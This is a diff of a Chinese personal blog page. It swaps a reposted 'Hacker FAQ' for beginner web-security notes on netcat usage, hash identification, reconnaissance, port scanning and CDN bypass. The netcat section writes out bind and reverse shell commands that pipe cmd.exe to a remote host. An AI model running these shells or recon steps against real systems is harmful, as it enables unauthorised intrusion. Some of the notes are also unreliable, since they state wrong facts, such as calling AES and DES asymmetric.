@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>【转载】hacker | frozenfish</title>
+  <title>web安全day1 | frozenfish</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="NEWS!A version of this has been bought by IBM DeveloperWorks.">
+  <meta name="description" content="1.Nc瑞士军刀使用详解1.tcp监听tcp监听 nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口 nc -l -p 9999 客户端测试 1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口 telnet 10.0.1.161 9999 2、B机器上也可以使用nmap扫描A机器的此端口 nmap 10.0.1.161 -p9999">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【转载】hacker">
-<meta property="og:url" content="http://example.com/2023/12/24/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91hacker/index.html">
+<meta property="og:title" content="web安全day1">
+<meta property="og:url" content="http://example.com/2023/12/15/web%E5%AE%89%E5%85%A81/index.html">
 <meta property="og:site_name" content="frozenfish">
-<meta property="og:description" content="NEWS!A version of this has been bought by IBM DeveloperWorks.">
+<meta property="og:description" content="1.Nc瑞士军刀使用详解1.tcp监听tcp监听 nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口 nc -l -p 9999 客户端测试 1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口 telnet 10.0.1.161 9999 2、B机器上也可以使用nmap扫描A机器的此端口 nmap 10.0.1.161 -p9999">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-12-24T07:30:16.000Z">
-<meta property="article:modified_time" content="2023-12-24T17:37:53.437Z">
+<meta property="article:published_time" content="2023-12-15T15:47:33.000Z">
+<meta property="article:modified_time" content="2023-12-25T18:39:55.839Z">
 <meta property="article:author" content="frozenfish">
 <meta name="twitter:card" content="summary">
   
@@ -242,14 +242,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-【转载】hacker" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-web安全1" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      【转载】hacker
+      web安全day1
     </h1>
   
 
@@ -261,8 +261,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2023/12/24/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91hacker/" class="archive-article-date">
-        <time datetime="2023-12-24T07:30:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-12-24</time>
+<a href="/2023/12/15/web%E5%AE%89%E5%85%A81/" class="archive-article-date">
+        <time datetime="2023-12-15T15:47:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-12-15</time>
 </a>
 
   
@@ -275,7 +275,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">2.5k字</span>
+      <span class="post-count">2.2k字</span>
     </span>
   </span>
 
@@ -284,7 +284,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">15分</span>
+      <span class="post-count">8分</span>
     </span>
   </span>
 </div>
@@ -295,32 +295,243 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <p>NEWS!<br>A version of this has been bought by IBM DeveloperWorks.</p>
+    <h1 id="1-Nc瑞士军刀使用详解"><a href="#1-Nc瑞士军刀使用详解" class="headerlink" title="1.Nc瑞士军刀使用详解"></a>1.Nc瑞士军刀使用详解</h1><h2 id="1-tcp监听"><a href="#1-tcp监听" class="headerlink" title="1.tcp监听"></a>1.tcp监听</h2><pre><code>tcp监听
+nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口
+nc -l -p 9999
+客户端测试
+1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口
+telnet 10.0.1.161 9999
+2、B机器上也可以使用nmap扫描A机器的此端口
+nmap 10.0.1.161 -p9999
+3、使用nc命令作为客户端工具进行端口探测
+nc -vz -w 2 10.0.1.161 9999
+（-v可视化，-z扫描时不发送数据，-w超时几秒，后面跟数字）
+服务端会自动关闭监听。
+4、nc可以扫描连续端口，这个作用非常重要。常常可以用来扫描服务器端口，然后给服务器安全加固
+在客户端B机器上扫描连续的两个端口，如下
+nc -vzw 2 10.0.1.161 9998-9999
+</code></pre>
+<h2 id="2-传文件"><a href="#2-传文件" class="headerlink" title="2.传文件"></a>2.传文件</h2><pre><code>方法1，先启动接收命令
+使用nc传输文件还是比较方便的，因为不用scp和rsync那种输入密码的操作了
+把A机器上的一个rpm文件发送到B机器上
+需注意操作次序，receiver先侦听端口，sender向receiver所在机器的该端口发送数据。 
+步骤1，先在B机器上启动一个接收文件的监听，格式如下
+意思是把赖在9995端口接收到的数据都写到file文件里（这里文件名随意取）
+格式：nc -l port &gt;file
+nc -l -p 9995 &gt;zabbix.rpm
+步骤2，在A机器上往B机器的9995端口发送数据，把下面rpm包发送过去
+nc 10.0.1.162 9995 &lt; zabbix-release-2.4-1.el6.noarch.rpm
+方法2，先启动发送命令
+步骤1，先在B机器上，启动发送文件命令
+下面命令表示通过本地的9992端口发送test.mv文件
+nc -l -p 9992 &lt;test.mv
+步骤2，A机器上连接B机器，取接收文件
+下面命令表示通过连接B机器的9992端口接收文件，并把文件存到本目录下，文件名为test2.mv
+nc 10.0.1.162 9992 &gt;test2.mv
+</code></pre>
 <span id="more"></span>
-<p>Furthermore, IBM sponsored another article, the Manager FAQ, a guide to managers for hackers who are frustrated and confused by corporate life. I’d like to thank IBM for their kind support of this project. I’m pretty happy with the new piece, and I’m glad to have finally been nudged into posting it.</p>
-<p>I’d like to point out how reasonable and friendly IBM has been about this; compare with the way that CRC has treated Eric Weisstein.</p>
-<p>I have a Powell’s “bookshelf”, which is sort of a list of recommended books; some are fairly relevant to this page. Look! Books!</p>
-<p>The Hacker FAQ<br>The following list is an attempt to cover some of the issues that will invariably come up when people without previous experience of the hacker community try to hire a hacker. This FAQ is intended for free distribution, and may be copied as desired. It is in an early revision. If you wish to modify the FAQ, or distribute it for publication, please contact the author. The author is <a href="mailto:&#x73;&#101;&#x65;&#x62;&#115;&#64;&#x70;&#108;&#x65;&#x74;&#x68;&#x6f;&#114;&#x61;&#x2e;&#110;&#101;&#116;">&#x73;&#101;&#x65;&#x62;&#115;&#64;&#x70;&#108;&#x65;&#x74;&#x68;&#x6f;&#114;&#x61;&#x2e;&#110;&#101;&#116;</a>. The official distribution site (as of revision 0.05) is “<a target="_blank" rel="noopener" href="http://www.plethora.net/~seebs/faqs/hacker.html">http://www.plethora.net/~seebs/faqs/hacker.html</a>“.</p>
-<p>DISCLAIMER: The author is a hacker. Bias is inevitable.</p>
-<p>This document is copyright 1995, 1996, 1998, 1999 Peter Seebach. Unaltered distribution is permitted.</p>
-<p>Revision 0.05 - Last modified September 28, 1999</p>
-<p>Questions and Answers:<br>Section 0: Basic understanding.<br>0.0: Won’t my hacker break into my computer and steal my trade secrets?<br>No. Hackers aren’t, contrary to media reporting, the people who break into computers. Those are crackers. Hackers are people who enjoy playing with computers. Your hacker may occasionally circumvent security measures, but this is not malicious; she just does it when the security is in her way, or because she’s curious.<br>0.1: Was it a good idea to hire a hacker?<br>It depends on the job. A hacker can be dramatically more effective than a non-hacker at a job, or dramatically less effective. Jobs where hackers are particularly good are:<br>Systems administration<br>Programming<br>Design<br>Jobs where hackers are particularly bad are:</p>
-<p>Data entry<br>More generally, a job that requires fast and unexpected changes, significant skill, and is not very repetitive will be one a hacker will excel at. Repetitive, simple jobs are a waste of a good hacker, and will make your hacker bored and frustrated. No one works well bored and frustrated.</p>
-<p>The good news is, if you get a hacker on something he particularly likes, you will frequently see performance on the order of five to ten times what a “normal” worker would produce. This is not consistent, and you shouldn’t expect to see it all the time, but it will happen. This is most visible on particularly difficult tasks.</p>
-<p>0.2: How should I manage my hacker?<br>The same way you herd cats. It can be a bit confusing; they’re not like most other workers. Don’t worry! Your hacker is likely to be willing to suggest answers to problems, if asked. Most hackers are nearly self-managing.<br>0.3: Wait, you just said “10 times”, didn’t you? You’re not serious, right?<br>Actually, I said “ten times”. And yes, I am serious; a hacker on a roll may be able to produce, in a period of a few months, something that a small development group (say, 7-8 people) would have a hard time getting together over a year. He also may not. Your mileage will vary.<br>IBM used to report that certain programmers might be as much as 100 times as productive as other workers, or more. This kind of thing happens.</p>
-<p>0.4: I don’t understand this at all. This is confusing. Is there a book on this?<br>Not yet. In the meantime, check out The New Hacker’s Dictionary (references below; also known as “the jargon file”), in particular some of the appendices. The entire work is full of clarifications and details of how hackers think.<br>Section 1: Social issues<br>1.0: My hacker doesn’t fit in well with our corporate society. She seems to do her work well, but she’s not really making many friends.<br>This is common. Your hacker may not have found any people around who get along with hackers. You may wish to consider offering her a position telecommuting, or flexible hours (read: night shift), which may actually improve her productivity. Or hire another one.<br>1.1: My hacker seems to dress funny. Is there any way to impress upon him the importance of corporate appearance?<br>Your hacker has a very good understanding of the importance of corporate appearance. It doesn’t help you get your job done. IBM, Ford, and Microsoft have all realized that people work better when they can dress however they want. Your hacker is dressed comfortably. A polite request to dress up some for special occasions may well be honored, and most hackers will cheerfully wear clothes without (unintentional) holes in them if specifically asked.<br>1.2: My hacker won’t call me by my title, and doesn’t seem to respect me at all.<br>Your hacker doesn’t respect your title. Hackers don’t believe that management is “above” engineering; they believe that management is doing one job, and engineering is doing another. They may well frequently talk as if management is beneath them, but this is really quite fair; your question implies that you talk as if engineering is beneath you. Treat your hacker as an equal, and she will probably treat you as an equal – quite a compliment!<br>1.3: My hacker constantly insults the work of my other workers.<br>Take your hacker aside, and ask for details of what’s wrong with the existing work. It may be that there’s something wrong with it. Don’t let the fact that it runs most of the time fool you; your hacker is probably bothered by the fact that it crashes at all. He may be able to suggest improvements which could dramatically improve performance, reliability, or other features. It’s worth looking into.<br>You may be able to convince your hacker to be more polite, but if there appear to be major differences, it’s quite possible that one or more of your existing staff are incompetent. Note that hackers, of course, have different standards of competence than many other people. (Read “different” as “much higher”.)</p>
-<p>Section 2: Productivity.<br>2.0: My hacker plays video games on company time.<br>Hackers, writers, and painters all need some amount of time to spend “percolating” – doing something else to let their subconscious work on a problem. Your hacker is probably stuck on something difficult. Don’t worry about it.<br>2.1: But it’s been two weeks since I saw anything!<br>Your hacker is working, alone probably, on a big project, and just started, right? She’s probably trying to figure it all out in advance. Ask her how it’s going; if she starts a lot of sentences, but interrupts them all with “no, wait…” or “drat, that won’t work”, it’s going well.<br>2.2: Isn’t this damaging to productivity?<br>No. Your hacker needs to recreate and think about things in many ways. He will be more productive with this recreation than without it. Your hacker enjoys working; don’t worry about things getting done reasonably well and quickly.<br>2.3: My hacker is constantly doing things unrelated to her job responsibilities.<br>Do they need to be done? Very few hackers can resist solving a problem when they can solve it, and no one else is solving it. For that matter, is your hacker getting her job done? If so, consider these other things a freebie or perk (for you). Although it may not be conventional, it’s probably helping out quite a bit.<br>2.4: My hacker is writing a book, reading USENET news, playing video games, talking with friends on the phone, and building sculptures out of paper clips. On company time!<br>He sounds happy. The chances are he’s in one of three states:<br>Basic job responsibilities are periodic (phone support, documentation, et al.) and there’s a lull in incoming work. Don’t worry about it!<br>Your hacker is stuck on a difficult problem.<br>Your hacker is bored silly and is trying to find amusement. Perhaps you should find him more challenging work?<br>Any of these factors may be involved. All of them may be involved. In general, if the work is challenging, and is getting done, don’t worry too much about the process. You might ask for your corporation to be given credit in the book.</p>
-<p>2.5: But my other workers are offended by my hacker’s success, and it hurts their productivity.<br>Do you really need to have workers around who would rather be the person getting something done, than have it done already? Ego has very little place in the workplace. If they can’t do it well, assign them to something they can do.<br>Section 3: Stimulus and response<br>3.0: My hacker did something good, and I want to reward him.<br>Good! Here are some of the things most hackers would like to receive in exchange for their work:<br>Respect.<br>Admiration.<br>Compliments.<br>Understanding.<br>Discounts on expensive toys.<br>Money.<br>These are not necessarily in order. The 4th item (understanding) is the most difficult. Try to remember this good thing your hacker just did the next time you discover he just spent a day playing x-trek. Rather than complaining about getting work done, write it off as “a perk” that was granted (informally) as a bonus for a job well done. Don’t worry; hackers get bored quickly when they aren’t doing their work.</p>
-<p>3.1: My hacker did something bad, and I want to punish him.<br>Don’t. 30 years of psychological research has shown that punishment has no desirable long-term effects. Your hacker is not a lab rat. (Even if he were a lab rat, punishment wouldn’t work; at least, not if he were one of the sorts of lab rats the psych research was done on.) If you don’t like something your hacker is doing, express your concerns. Explain what it is that bothers you about the behavior.<br>Be prepared for an argument; your hacker is a rational entity, and presumably had reasons. Don’t jump on him too quickly; they may turn out to be good reasons.</p>
-<p>Don’t be afraid to apologize if you’re wrong. If your hacker admits to having been wrong, don’t demand an apology; so far as the hacker is concerned, admitting to being wrong is an apology, most likely.</p>
-<p>3.2: I don’t get it. I offered my hacker a significant promotion, and she turned it down and acted offended.<br>A promotion frequently involves spending more time listening to people describing what they’re doing, and less time playing with computers. Your hacker is enjoying her work; if you want to offer a reward, consider an improvement in title, a possible raise, and some compliments. Make sure your hacker knows you are pleased with her accomplishments – that’s what she’s there for.<br>3.3: My company policy won’t let me give my hacker any more raises until he’s in management.<br>Your company policy is broken. A hacker can earn as much as $200 an hour (sometimes more) doing freelance consulting. You may wish to offer your hacker a contracted permanent consulting position with benefits, or otherwise find loopholes. Or, find perks to offer - many hackers will cheerfully accept a discount on hardware from their favorite manufacturer as an effective raise.<br>3.4: I can’t believe the hacker on my staff is worth as much as we’re paying.<br>Ask the other staff in the department what the hacker does, and what they think of it. The chances are that your hacker is spending a few hours a week answering arcane questions that would otherwise require an expensive external consultant. Your hacker may be fulfilling another job’s worth of responsibilities in his spare time around the office. Very few hackers aren’t worth what they’re getting paid; they enjoy accomplishing difficult tasks, and improving worker efficiency.<br>Section 4: What does that mean?<br>4.0: My hacker doesn’t speak English. At least, I don’t think so.<br>Your hacker is a techie. Your best bet is to pick up a copy of TNHD (The New Hacker’s Dictionary). It can be found as <a target="_blank" rel="noopener" href="http://catb.org/esr/jargon">http://catb.org/esr/jargon</a> (last I checked) or from a good bookstore. If you have trouble understanding that reference, ask your hacker if she has a copy, or would be willing to explain her terms. Most hackers are willing to explain terms. Be ready for condescension; it’s not intended as an insult, but if you don’t know the words, she probably has to talk down to you at first to explain them.<br>It’s a reasonably difficult set of words; there are a lot of them, and their usage is much more precise than it sounds. Hackers love word games.</p>
-<p>[It is also possible that English is not your hacker’s native language, and that it’s not yours either. Feel free to substitute a more appropriate language.]</p>
-<p>4.1: I can’t get an estimate out of my hacker.<br>Your hacker hasn’t figured out how hard the problem is yet. Unlike most workers, hackers will try very hard to refuse to give an estimate until they know for sure that they understand the problem. This may include solving it.<br>No good engineer goes beyond 95% certainty. Most hackers are good engineers. If you say you will not try to hold him to the estimate (and mean it!) you are much more likely to get an approximate estimate. The estimate may sound very high or very low; it may be very high or very low. Still, it’s an estimate, and you get what you ask for.</p>
-<p>4.2: My hacker makes obscure, meaningless jokes.<br>If you feel brave, ask for an explanation. Most of them can be explained. It may take a while, but it may prove interesting.<br>4.3: My hacker counts from zero.<br>So does the computer. You can hide it, but computers count from zero. Most hackers do by habit, also.<br>If you found this information useful, please consider sending a token donation to the author; email for details. You might also consider buying a couple of books through my “affiliate program” link; you get cool books, I get pocket change. :)</p>
-<p>Recommended books:<br>The links in this section will all try to take you to Powell’s, where you can spend your money on cool books.</p>
-<p>The Cathedral &amp; the Bazaar (Eric Raymond) - a discussion of different ways of building systems.</p>
-<p>The New Hacker’s Dictionary (Eric Raymond) - a great source of trivia, lore, and translations for difficult concepts. (Not always in stock, I’m afraid.)</p>
-<p><a target="_blank" rel="noopener" href="https://www.seebs.net/faqs/hacker.html">https://www.seebs.net/faqs/hacker.html</a></p>
+
+<h2 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h2><pre><code>方法1、REMOTE主机绑定SHELL
+在公网监听
+nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe
+或者
+nc -l -p 5555 -t -e cmd.exe
+在内网主动建立连接
+nc -nvv 192.168.153.138 5555
+-t是通过telne模式执行 cmd.exe 程序，可以省略。
+讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口
+方法2、REMOTE主机绑定SHELL并反向连接
+在公网监听
+nc -lp 5555
+在内网机器反弹
+nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354
+或者
+nc -t -e cmd 192.168.153.140 5555
+讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口
+</code></pre>
+<h1 id="2-加解密"><a href="#2-加解密" class="headerlink" title="2.加解密"></a>2.加解密</h1><pre><code class="md5">md5
+ 16位和32位 0-9 和a-f 组成的字符串
+ 
+ 
+ 解密：
+ 1.知道算法
+ 2.碰撞枚举生成密文
+ 
+ 
+ 
+ 有特殊情况。md5会加salt一个字符串。
+
+    discuz
+</code></pre>
+<pre><code class="sha1">SHA1
+和md5特征差不多，只是位数是40
+</code></pre>
+<pre><code class="NTLM">NTLM
+WINDOWS系统哈希密码，标准通讯安全协议
+win7之后使用的密码
+之前是LM
+</code></pre>
+<pre><code>aes，des，rc4
+都是非对称加密。印度密钥，密文特质与base64类似
+</code></pre>
+<p>大小写敏感</p>
+<pre><code>base64 通常以=结尾、1-9 a-f
+</code></pre>
+<pre><code>url 通常以=结尾、1-9 a-f 通常以%数字字母分割 
+</code></pre>
+<pre><code>编码
+
+
+gbk，utf-8
+</code></pre>
+<h4 id="颜文字加密：aaencode"><a href="#颜文字加密：aaencode" class="headerlink" title="颜文字加密：aaencode"></a>颜文字加密：aaencode</h4><pre><code>jother： +()[]&#123;&#125;
+jsfuck是和jother很像。少了&#123;&#125;
+</code></pre>
+<h4 id="图片里包含文件的技术"><a href="#图片里包含文件的技术" class="headerlink" title="图片里包含文件的技术"></a>图片里包含文件的技术</h4><h1 id="3-判断操作系统"><a href="#3-判断操作系统" class="headerlink" title="3.判断操作系统"></a>3.判断操作系统</h1><h2 id="ttl"><a href="#ttl" class="headerlink" title="ttl"></a>ttl</h2><pre><code>WINDOWS NT/2000   TTL：128
+WINDOWS 95/98     TTL：32
+UNIX              TTL：255
+LINUX             TTL：64
+WIN7          	  TTL：64
+</code></pre>
+<p>nmap使用技术可以具体了解判定方法</p>
+<h1 id="4-数据库判定"><a href="#4-数据库判定" class="headerlink" title="4.数据库判定"></a>4.数据库判定</h1><p>​	端口扫描</p>
+<pre><code>mysql 3306
+
+oracle 1521
+
+sql server 1433
+
+db2 5000
+</code></pre>
+<h1 id="5-主动打点和被动打点"><a href="#5-主动打点和被动打点" class="headerlink" title="5.主动打点和被动打点"></a>5.主动打点和被动打点</h1><pre><code>主动式信息打点：主动使用工具、主动发起测试流量等
+被动式信息打点：调用接口获取信息等
+</code></pre>
+<h1 id="6-收集"><a href="#6-收集" class="headerlink" title="6.收集"></a>6.收集</h1><ul>
+<li><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2></li>
+<li><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2></li>
+<li><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2></li>
+<li><h2 id="源码名称"><a href="#源码名称" class="headerlink" title="源码名称"></a>源码名称</h2></li>
+</ul>
+<h1 id="7-泄露原码（cms找不到的情况）"><a href="#7-泄露原码（cms找不到的情况）" class="headerlink" title="7.泄露原码（cms找不到的情况）"></a>7.泄露原码（cms找不到的情况）</h1><h2 id="git和svn"><a href="#git和svn" class="headerlink" title="git和svn"></a>git和svn</h2><pre><code>githack原理
+   .git
+svnhack原理
+   .svn
+</code></pre>
+<h2 id="目录备份"><a href="#目录备份" class="headerlink" title="目录备份"></a>目录备份</h2><pre><code>目录扫描秒了
+</code></pre>
+<h2 id="DsStore"><a href="#DsStore" class="headerlink" title="DsStore"></a>DsStore</h2><pre><code>mac的上传软件
+ds_store
+</code></pre>
+<h2 id="PHP源码泄露"><a href="#PHP源码泄露" class="headerlink" title="PHP源码泄露"></a>PHP源码泄露</h2><pre><code>java有maven
+node.js有npm
+php有composer
+   composer.json配置文件
+         里面有配置信息。插件。中间件信息
+</code></pre>
+<h2 id="WEB-INF-web-xml"><a href="#WEB-INF-web-xml" class="headerlink" title="WEB-INF&#x2F;web.xml"></a>WEB-INF&#x2F;web.xml</h2><pre><code>web-inf 是java的web应用安全目录，要是想访问文件。必须在web.xml文件对要访问的文件进行映射 
+</code></pre>
+<h1 id="8-信息收集"><a href="#8-信息收集" class="headerlink" title="8.信息收集"></a>8.信息收集</h1><p>github的readme邮箱，版权声明。域名常用搜索。</p>
+<h1 id="9。端口扫描"><a href="#9。端口扫描" class="headerlink" title="9。端口扫描"></a>9。端口扫描</h1><ol>
+<li>网络架构。</li>
+<li>内网资产，内网协议</li>
+<li>阻碍信息，cdn，waf。负载，防火墙。</li>
+<li>端口（1-65535）</li>
+</ol>
+<pre><code>nmap 协议。端口扫描。防火墙识别
+masscan 协议，端口扫描、
+</code></pre>
+<h1 id="10-端口渗透"><a href="#10-端口渗透" class="headerlink" title="10.端口渗透"></a>10.端口渗透</h1><h1 id="11-c段-旁注"><a href="#11-c段-旁注" class="headerlink" title="11.c段&#x2F;旁注"></a>11.c段&#x2F;旁注</h1><h2 id="旁注"><a href="#旁注" class="headerlink" title="旁注"></a>旁注</h2><pre><code>171.40.78.44
+www.123.com
+www.44.com
+www.54454.com
+</code></pre>
+<h2 id="c段"><a href="#c段" class="headerlink" title="c段"></a>c段</h2><pre><code>然后用ip反查查看绑定域名。可以进去看看资产
+同网段渗透
+</code></pre>
+<h1 id="cdn判断"><a href="#cdn判断" class="headerlink" title="cdn判断"></a>cdn判断</h1><pre><code>超级ping。全国各地ping一下秒了
+</code></pre>
+<h1 id="waf判断"><a href="#waf判断" class="headerlink" title="waf判断"></a>waf判断</h1><p><a target="_blank" rel="noopener" href="https://www.wangan.com/p/11v71302b8c5ab87">https://www.wangan.com/p/11v71302b8c5ab87</a></p>
+<pre><code>工具
+ wafw00f
+</code></pre>
+<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><pre><code>工具：
+    lbd
+</code></pre>
+<h1 id="cdn绕过"><a href="#cdn绕过" class="headerlink" title="cdn绕过"></a>cdn绕过</h1><pre><code>1.子域名查询。有些子域名没有加速cdn
+比如你直接访问 www.baidu.com
+他如果没买*.baidu.com
+那么访问test.baidu.com
+      baidu.com都会暴露真实ip
+ 注意！！！！！！！！当然这建立在主域名和子域名同个服务器。有些吊毛不这样做
+2.利用网站漏洞暴露真实ip
+3.历史dns记录
+4.MX
+5.国外请求(仅限中国大陆策略下)
+    全球cdn查询:tools.ipip.net
+    找冷们cdn。他一定不会部署cdn
+6.zmap
+7.网络空间搜索引擎：
+    zoomeye。fofa、shodan
+8.部分加速的就可以看网络请求包
+</code></pre>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><pre><code>漏洞&amp;遗留文件
+    像是有些配置文件。比如phpInfo.php里面就会配置ip地址.从而得知真实ip，适用于没有内网网卡。
+</code></pre>
+<pre><code>1.传统访问：访问域名-&gt;dns-&gt;目标主机
+2.cdn瑞克派：访问域名-&gt;cdn-&gt;
+3.访问域名-&gt;-&gt;
+4. 主动邮件配合备案
+    让对方服务器主动发邮件给你（注册、找回密码等功能）
+5.抓APP包: 
+    有时候网站使用了CDN，但是可能其APP没有使用，那么通过抓取APP的数据包有可能得出真实的IP地址
+6.国外第三方测试CDN网站（结合了几种方法于一身）
+    https://get-site-ip.com/
+7.查看历史解析IP
+    https://site.ip138.com/
+    https://viewdns.info/
+8.全网扫描FuckCDN(没有办法的办法)
+    厂商查询：
+        https://tools.ipip.net/cdn.php
+    IP库筛地址段
+        https://www.cz88.net/geo-public //IP库资源,要下载客户端
+    全网扫描：
+        https://github.com/Tai7sy/fuckcdn
+9.ssrf漏洞
+    想办法让对方主机访问你，你自己弄个web服务，监听个端口，记录日志。
+    然后通过漏洞·让对方访问你，于是就得到ip&#39;了
+</code></pre>
+<h3 id="牛逼的工具"><a href="#牛逼的工具" class="headerlink" title="牛逼的工具"></a>牛逼的工具</h3><p>​	get-site-ip.com</p>
+<h3 id="找到cdn后咋办？"><a href="#找到cdn后咋办？" class="headerlink" title="找到cdn后咋办？"></a>找到cdn后咋办？</h3><pre><code>绑定host文件直接指向真实ip
+后期测试测对地方
+</code></pre>
+<h1 id="正向连接和反向连接"><a href="#正向连接和反向连接" class="headerlink" title="正向连接和反向连接"></a>正向连接和反向连接</h1><h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a><strong>正向连接</strong></h2><p>​		</p>
+<pre><code>正向连接是受害主机监听一个端口，由控制主机主动去连接受害主机的过程，适用于受害主机具有[公网ip](https://so.csdn.net/so/search?q=公网ip&amp;spm=1001.2101.3001.7020)的情况下。例如下面，受害主机具有公网ip，被控主机kali可以通过ip地址访问到受害主机，所以能够使用正相连接来控制受害主机。
+</code></pre>
+<h2 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a><strong>反向连接</strong></h2><pre><code>反向连接是控制主机监听一个端口，由受害主机反向去连接控制主机的过程，适用于受害主机出网（或出网且没有公网ip）的情况。例如，受害主机是一台位于内网，并且没有公网ip且能访问互联网的主机，控制主机无法直接通过ip地址访问到受害主机。所以此时需要在控制主机上监听一个端口，让受害机主动连接控制主机，从而实现对控制主机的控制。
+
+由于正向连接是被攻击者主动连接攻击者，所以不受防火墙策略的限制
+</code></pre>
+<h1 id="逆向方向"><a href="#逆向方向" class="headerlink" title="逆向方向"></a>逆向方向</h1><h2 id="代码分析-抓包分析"><a href="#代码分析-抓包分析" class="headerlink" title="代码分析&amp;抓包分析"></a>代码分析&amp;抓包分析</h2><ol>
+<li><p>app&amp;&amp;小程序</p>
+<ol>
+<li><p>收集app里的所有地址，收集所有请求。api</p>
+</li>
+<li><p>oss阿里云的服务，他又他的客户端。存储资源</p>
+</li>
+</ol>
+</li>
+<li><p>抓包封包</p>
+</li>
+<li><p>逆向二进制</p>
+</li>
+<li><p>反框架检测</p>
+</li>
+</ol>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><hr>
+<h2 id="内在搜索："><a href="#内在搜索：" class="headerlink" title="内在搜索："></a>内在搜索：</h2><h3 id="appinfoScanner自动反编译"><a href="#appinfoScanner自动反编译" class="headerlink" title="appinfoScanner自动反编译"></a>appinfoScanner自动反编译</h3><pre><code>移动端，ios，web，hs。静态网站信息收集工具。基本信息收集，title。dormain。cdn。指纹信息。状态信息，内在提取。反编译收集
+</code></pre>
+<h3 id="idea手动反编译内在搜索"><a href="#idea手动反编译内在搜索" class="headerlink" title="idea手动反编译内在搜索"></a>idea手动反编译内在搜索</h3><h3 id="安卓修改大师"><a href="#安卓修改大师" class="headerlink" title="安卓修改大师"></a>安卓修改大师</h3><pre><code>可以连接真机去抓包
+</code></pre>
 
     
 
@@ -382,7 +593,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2023/12/24/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91hacker/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2023/12/15/web%E5%AE%89%E5%85%A81/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -397,18 +608,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2023/12/26/%E5%8A%A0%E8%A7%A3%E5%AF%86/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2023/12/17/php%E5%BC%80%E5%8F%91/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          加解密
+          php开发
         
       </div>
     </a>
   
   
-    <a href="/2023/12/24/%E5%85%B3%E4%BA%8E%E5%85%89%E7%8C%AB%E6%8A%98%E8%85%BE/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">关于光猫折腾</div>
+    <a href="/2023/12/11/linux%E8%BF%90%E7%BB%B4%E6%8A%80%E6%9C%AF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">linux运维技术</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -435,7 +646,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
